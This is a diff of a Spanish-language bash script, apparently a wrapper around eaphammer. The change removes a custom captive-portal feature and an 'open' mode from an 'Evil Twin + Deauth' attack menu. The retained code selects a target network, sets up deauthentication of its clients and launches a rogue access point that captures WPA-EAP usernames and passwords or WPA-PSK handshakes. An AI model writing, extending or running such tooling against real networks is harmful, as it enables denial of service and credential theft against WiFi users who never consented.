@@ -6,7 +6,6 @@ bssid_target=""
 channel_target=""
 deauth_pid=""
 auth_mode="wpa-eap"   # Modo de autenticación por defecto
-custom_portal=""      # Ruta del portal cautivo personalizado
 psk_password=""       # Contraseña para modo PSK
 
 # Función para verificar y generar certificados
@@ -35,27 +34,6 @@ check_certificates() {
         echo -e "\033[32m[✓] Certificados encontrados\033[0m"
         return 0
     fi
-}
-
-# Función para verificar portal cautivo personalizado
-check_custom_portal() {
-    if [ -z "$custom_portal" ]; then
-        return 1
-    fi
-    
-    if [ ! -d "$custom_portal" ]; then
-        echo -e "\033[31m[!] Error: El directorio del portal no existe\033[0m"
-        return 1
-    fi
-    
-    # Verificar que existe index.html
-    if [ ! -f "$custom_portal/index.html" ]; then
-        echo -e "\033[31m[!] Error: No se encuentra index.html en el portal\033[0m"
-        return 1
-    fi
-    
-    echo -e "\033[32m[✓] Portal cautivo personalizado válido\033[0m"
-    return 0
 }
 
 # Función para limpiar procesos al salir
@@ -90,7 +68,7 @@ cleanup() {
 
 trap cleanup EXIT
 
-until [ "$optport" = "8" ]
+until [ "$optport" = "7" ]
 do
     echo -e "\e[1;31m$(cat log/log4 2>/dev/null)\e[0m"
     echo ""
@@ -101,10 +79,9 @@ do
     echo "[2] Seleccionar interfaz para Deauth"
     echo "[3] Escanear y seleccionar red objetivo"
     echo "[4] Configurar modo de autenticación"
-    echo "[5] Configurar portal cautivo personalizado"
-    echo "[6] Configurar ataque de deauthentication"
-    echo "[7] Iniciar Evil Twin + Deauth"
-    echo "[8] Salir"
+    echo "[5] Configurar ataque de deauthentication"
+    echo "[6] Iniciar Evil Twin + Deauth"
+    echo "[7] Salir"
     echo ""
     echo -e "\033[36m[*] Estado actual:\033[0m"
     echo ""
@@ -116,9 +93,6 @@ do
     echo "[-] Modo autenticación: ${auth_mode}"
     if [ "$auth_mode" = "wpa-psk" ]; then
         echo "[-] Contraseña PSK: ${psk_password:+Configurada}"
-    fi
-    if [ ! -z "$custom_portal" ]; then
-        echo "[-] Portal personalizado: $custom_portal"
     fi
     echo ""
     read -p $'\e[33m[-] Elige una opcion: \e[0m' optport
@@ -229,10 +203,9 @@ do
             echo "[!] Diferentes modos capturan diferentes credenciales:"
             echo ""
             echo "[1] WPA-EAP (Usuario + Contraseña) - Solicita username y password"
-            echo "[2] Open (Solo Contraseña) - Solo solicita password de WiFi"
-            echo "[3] WPA-PSK (Evil Twin con contraseña) - Simula red WPA2-Personal"
+            echo "[2] WPA-PSK (Evil Twin con contraseña) - Simula red WPA2-Personal"
             echo ""
-            read -p $'\e[33m[-] Seleccione el modo [1-3]: \e[0m' auth_type
+            read -p $'\e[33m[-] Seleccione el modo [1-2]: \e[0m' auth_type
             echo ""
             case $auth_type in
                 1)
@@ -241,11 +214,6 @@ do
                     echo -e "\033[32m[!] Modo WPA-EAP seleccionado (captura usuario + contraseña)\033[0m"
                 ;;
                 2)
-                    auth_mode="open"
-                    psk_password=""
-                    echo -e "\033[32m[!] Modo Open seleccionado (captura solo contraseña)\033[0m"
-                ;;
-                3)
                     auth_mode="wpa-psk"
                     echo ""
                     echo -e "\033[36m[*] Configuración de WPA-PSK:\033[0m"
@@ -277,55 +245,6 @@ do
         ;;
         
         5)
-            echo ""
-            echo -e "\033[36m[*] Configuración de portal cautivo personalizado:\033[0m"
-            echo ""
-            echo "[!] El portal cautivo se usa con modo Open o WPA-PSK"
-            echo "[!] Debe ser un directorio que contenga index.html"
-            echo ""
-            echo "[1] Especificar ruta de portal personalizado"
-            echo "[2] Usar portal por defecto de eaphammer"
-            echo "[3] Borrar configuración de portal personalizado"
-            echo ""
-            read -p $'\e[33m[-] Seleccione una opción [1-3]: \e[0m' portal_opt
-            echo ""
-            
-            case $portal_opt in
-                1)
-                    read -p $'\e[33m[-] Ingrese la ruta completa del directorio del portal: \e[0m' custom_portal
-                    
-                    # Validar el portal
-                    if check_custom_portal; then
-                        echo ""
-                        echo -e "\033[32m[!] Portal cautivo configurado: $custom_portal\033[0m"
-                        
-                        # Listar archivos del portal
-                        echo ""
-                        echo -e "\033[36m[*] Archivos encontrados en el portal:\033[0m"
-                        ls -lh "$custom_portal"
-                    else
-                        custom_portal=""
-                    fi
-                ;;
-                2)
-                    custom_portal=""
-                    echo -e "\033[32m[!] Se usará el portal por defecto de eaphammer\033[0m"
-                ;;
-                3)
-                    custom_portal=""
-                    echo -e "\033[32m[!] Configuración de portal personalizado borrada\033[0m"
-                ;;
-                *)
-                    echo -e "\033[33m[!] Opción no válida\033[0m"
-                ;;
-            esac
-            
-            echo ""
-            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
-            clear
-        ;;
-        
-        6)
             if [ -z "$bssid_target" ]; then
                 echo ""
                 echo -e "\033[31m[!] Error: Primero debe escanear y configurar la red objetivo (opción 3)\033[0m"
@@ -366,7 +285,7 @@ do
             clear
         ;;
         
-        7)
+        6)
             if [ -z "$stationPort" ] || [ -z "$deauthPort" ] || [ -z "$essidname" ] || [ -z "$bssid_target" ] || [ -z "$channel_target" ]; then
                 echo ""
                 echo -e "\033[31m[!] Error: Faltan configuraciones. Complete las opciones necesarias primero\033[0m"
@@ -400,19 +319,6 @@ do
                 fi
             fi
             
-            # Verificar portal personalizado si está configurado
-            if [ ! -z "$custom_portal" ]; then
-                if ! check_custom_portal; then
-                    echo ""
-                    read -p $'\e[33m[-] ¿Continuar sin portal personalizado? [s/N]: \e[0m' continue_opt
-                    if [ "$continue_opt" != "s" ] && [ "$continue_opt" != "S" ]; then
-                        clear
-                        continue
-                    fi
-                    custom_portal=""
-                fi
-            fi
-            
             echo ""
             echo -e "\033[32m[!] Iniciando ataque Evil Twin + Deauth\033[0m"
             echo ""
@@ -426,9 +332,6 @@ do
             echo "[-] Modo autenticación: $auth_mode"
             if [ "$auth_mode" = "wpa-psk" ]; then
                 echo "[-] Contraseña PSK: $psk_password"
-            fi
-            if [ ! -z "$custom_portal" ]; then
-                echo "[-] Portal personalizado: $custom_portal"
             fi
             echo ""
             read -p $'\e[33m[-] Presione ENTER para iniciar el ataque: \e[0m' ENTER
@@ -481,27 +384,12 @@ do
                     eap_cmd="$eap_cmd --auth wpa-eap --creds"
                 ;;
                 
-                "open")
-                    # Modo Open con portal cautivo
-                    eap_cmd="$eap_cmd --auth open --captive-portal"
-                    
-                    # Agregar portal personalizado si está configurado
-                    if [ ! -z "$custom_portal" ]; then
-                        eap_cmd="$eap_cmd --portal-template \"$custom_portal\""
-                    fi
-                ;;
-                
                 "wpa-psk")
                     # Modo WPA-PSK
-                    eap_cmd="$eap_cmd --auth wpa-psk --wpa-passphrase \"$psk_password\" --captive-portal"
-                    
-                    # Agregar portal personalizado si está configurado
-                    if [ ! -z "$custom_portal" ]; then
-                        eap_cmd="$eap_cmd --portal-template \"$custom_portal\""
-                    fi
+                    eap_cmd="$eap_cmd --auth wpa-psk --wpa-passphrase \"$psk_password\""
                     
                     echo -e "\033[36m[*] Modo WPA-PSK: Los clientes necesitarán la contraseña '$psk_password' para conectarse\033[0m"
-                    echo -e "\033[36m[*] Capturando handshakes y credenciales del portal...\033[0m"
+                    echo -e "\033[36m[*] Capturando handshakes...\033[0m"
                     echo ""
                 ;;
             esac
@@ -530,9 +418,7 @@ do
             clear
         ;;
         
-
-        
-        8)
+        7)
             clear
             echo -e "\033[32m[!] Saliendo...\033[0m"
             echo ""
